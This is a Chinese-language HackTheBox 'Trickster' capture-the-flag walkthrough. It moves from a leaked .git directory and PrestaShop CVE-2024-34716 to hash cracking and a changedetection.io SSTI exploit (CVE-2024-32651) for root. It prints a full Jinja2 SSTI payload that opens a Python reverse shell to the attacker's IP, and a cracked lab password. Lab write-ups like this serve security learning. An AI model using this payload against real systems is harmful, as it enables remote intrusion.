---
title: "HTB-Trickster"
date: 2024-09-28
categories: 
  - "HTB-Machine"
tags: 
  - "hackthebox"
  - "linux"
---

## Box Info

| OS | Linux |
| --- | --- |
| Difficulty | Medium |

## Git Hack

我在trickster的主域名发现了一个shop的子域名网站

![](./images/image-307.png)

这个shop看起来像是使用`PrestaShop`搭建，我搜索了一下相关的漏洞，无法直接使用

![](./images/image-308.png)

并且尝试了shop里的各种注入点，没有明显的漏洞，不过在我遍历目录的时候，发现了`.git`的目录

![](./images/image-310.png)

然后我使用`Githack`工具

\[github author="lijiejie" project="GitHack"\]\[/github\]

![](./images/image-311.png)

将这个目录作为url的路径，进入到了后台的登陆界面，并且得到PrestaShop的版本号为`8.1.5`

![](./images/image-312.png)

在之前的`.git`目录下我搜索到了一个`admin_pannel`，里面好像存在一个adam的用户

![](./images/image-313.png)

## CVE-2024-34716

\[github author="aelmokhtar" project="CVE-2024-34716"\]\[/github\]

![](./images/image-314.png)

得到`www-data`权限

在config里面找到一些信息

![](./images/image-315.png)

登录上mysql之后，在`ps_employee`表中发现james的密码hash

![](./images/image-316.png)

使用`hashcat`，破解除了james的密码：`alwaysandforever`

![](./images/image-317.png)

ssh登录上去，得到user.txt

![](./images/image-318.png)

## Privilege Escalation

上传`linpeas`，发现当前服务器运行着docker

![](./images/image-319.png)

上传`fscan`，发现`172.17.0.2`主机

\[github author="shadow1ng" project="fscan"\]\[/github\]

![](./images/image-320.png)

并且发现`5000`端口是打开的

![](./images/image-321.png)

将端口代理出来

![](./images/image-322.png)

进入到`Change Detection`

![](./images/image-323.png)

### CVE-2024-32651

相关知识：[CVE-2024-32651 –（Changedetection.io） – Hacktive 安全博客 (hacktivesecurity.com)](https://blog.hacktivesecurity.com/index.php/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/)

首先在kali上打开httpserver服务，并且添加到change detection

![](./images/image-325.png)

![](./images/image-324.png)

进入Edit，确保URL、Time、Send notification

![](./images/image-326.png)

然后进入notification，在Body处写入SSTI反弹shell的脚本

```
{{ self.__init__.__globals__.__builtins__.__import__('os').system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.30",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'') }}
```

![](./images/image-327.png)

然后保存即可

此处SSTI的原理是，这个服务会探测网站的变化，如果网站内容有变化那么就会触发通知信息

而Body是允许使用Jinja2模板来写内容

![](./images/image-331.png)

在kali上面，由于打开了80端口的httpserver服务，只需要写入一个`index.html`，并且不断修改他直到被检测到就行了

![](./images/image-332.png)

成功反弹到shell，但是没有root.txt呢？应该只是一个容器

使用`history`命令发现到密码，因为`apt update`需要管理员权限才能执行

![](./images/image-333.png)

使用密码切换到root用户，得到root.txt

![](./images/image-334.png)

## Summary

Git文件泄露好久没遇到过，刚做的时候还没想到这个，去讨论区看了一下才发现

`PrestaShop`的`Github CVE`，在几天前是用不了的（不知道为什么），后来作者修改了一下又能正常使用了

`history`来查看密码泄露也是比较独特的点，之前也没想到
